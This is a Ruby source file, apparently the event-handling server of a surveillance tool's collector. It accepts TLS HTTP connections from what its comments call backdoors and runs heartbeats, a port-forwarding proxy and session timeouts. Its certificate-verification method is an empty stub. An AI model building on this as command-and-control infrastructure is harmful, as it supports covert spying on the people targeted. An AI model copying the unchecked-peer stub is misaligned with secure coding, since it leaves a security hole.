#
#  Event handlers
#

# relatives
require_relative 'heartbeat.rb'
require_relative 'parser.rb'
require_relative 'sessions.rb'

# from RCS::Common
require 'rcs-common/trace'
require 'rcs-common/status'

# system
require 'eventmachine'
require 'evma_httpserver'
require 'socket'
require 'em-proxy'

module RCS
module DB

class HTTPHandler < EM::Connection
  include RCS::Tracer
  include EM::HttpServer
  include Parser

  attr_reader :peer
  attr_reader :peer_port

  def post_init
    # don't forget to call super here !
    super

    # we want the connection to be encrypted with ssl
    #TODO: put the name in the config
    start_tls(:private_key_file => './config/rcs-db.key', :cert_chain_file => './config/rcs-db.crt', :verify_peer => true)

    # to speed-up the processing, we disable the CGI environment variables
    self.no_environment_strings

    # set the max content length of the POST
    self.max_content_length = 30 * 1024 * 1024

    # get the peer name
    @peer_port, @peer = Socket.unpack_sockaddr_in(get_peername)
    trace :debug, "Connection from #{@peer}:#{@peer_port}"
  end

  def ssl_handshake_completed
    trace :debug, "SSL Handshake completed successfully"
  end

  def ssl_verify_peer(cert)
    #TODO: check if the client cert is valid
  end

  def unbind
    trace :debug, "Connection closed #{@peer}:#{@peer_port}"
  end

  def process_http_request
    # the http request details are available via the following instance variables:
    #   @http_protocol
    #   @http_request_method
    #   @http_cookie
    #   @http_if_none_match
    #   @http_content_type
    #   @http_path_info
    #   @http_request_uri
    #   @http_query_string
    #   @http_post_content
    #   @http_headers

    trace :debug, "[#{@peer}] Incoming HTTP Connection"
    trace :debug, "[#{@peer}] Request: [#{@http_request_method}] #{@http_request_uri}"

    resp = EM::DelegatedHttpResponse.new(self)

    # Block which fulfills the request
    operation = proc do

      # do the dirty job :)
      # here we pass the control to the internal parser which will return:
      #   - the content of the reply
      #   - the content_type
      #   - the cookie if the backdoor successfully passed the auth phase
      begin
        status, content, content_type, cookie = http_parse(@http_headers.split("\x00"), @http_request_method, @http_request_uri, @http_cookie, @http_post_content)
      rescue Exception => e
        trace :error, "ERROR: " + e.message
        trace :fatal, "EXCEPTION: " + e.backtrace.join("\n")
      end

      # prepare the HTTP response
      resp.status = status
      #TODO: status_string from status
      resp.status_string = "OK"
      resp.content = content
      resp.headers['Content-Type'] = content_type
      resp.headers['Set-Cookie'] = cookie unless cookie.nil?
      #TODO: investigate the keep-alive option
      #resp.keep_connection_open = true
      resp.headers['Connection'] = 'close'
    end

    # Callback block to execute once the request is fulfilled
    callback = proc do |res|
    	resp.send_response
    end

    # Let the thread pool handle request
    EM.defer(operation, callback)
  end

end #HTTPHandler


class Events
  include RCS::Tracer

  def start_proxy(local_port, server, server_port)
    Thread.new do
      trace :info, "Forwarding port #{local_port} to #{server}:#{server_port}..."
      
      Proxy.start(:host => "0.0.0.0", :port => local_port, :debug => false) do |conn|
        conn.server :srv, :host => server, :port => server_port

        conn.on_data do |data|
          data
        end

        conn.on_response do |backend, resp|
          resp
        end

        conn.on_finish do |backend, name|
          unbind if backend == :srv
        end
      end
    end
  end
  
  def setup(port = 4444)

    # main EventMachine loop
    begin

      #start the proxy for the XML-RPC calls
      start_proxy(port - 1, Config.global['DB_ADDRESS'], port - 1)

      # all the events are handled here
      EM::run do
        # if we have epoll(), prefer it over select()
        EM.epoll

        # set the thread pool size
        EM.threadpool_size = 50

        # we are alive and ready to party
        Status.my_status = Status::OK

        # start the HTTP REST server
        EM::start_server("0.0.0.0", port, HTTPHandler)
        trace :info, "Listening on port #{port}..."

        # send the first heartbeat to the db, we are alive and want to notify the db immediately
        # subsequent heartbeats will be sent every HB_INTERVAL
        HeartBeat.perform

        # set up the heartbeat (the interval is in the config)
        EM::PeriodicTimer.new(Config.global['HB_INTERVAL']) { EM.defer(proc{ HeartBeat.perform }) }

        # timeout for the sessions (will destroy inactive sessions)
        EM::PeriodicTimer.new(60) { SessionManager.instance.timeout }
      end
    rescue Exception => e
      # bind error
      if e.message.eql? 'no acceptor' then
        trace :fatal, "Cannot bind port #{Config.global['LISTENING_PORT']}"
        return 1
      end
      raise
    end

  end

end #Events

end #Collector::
end #RCS::

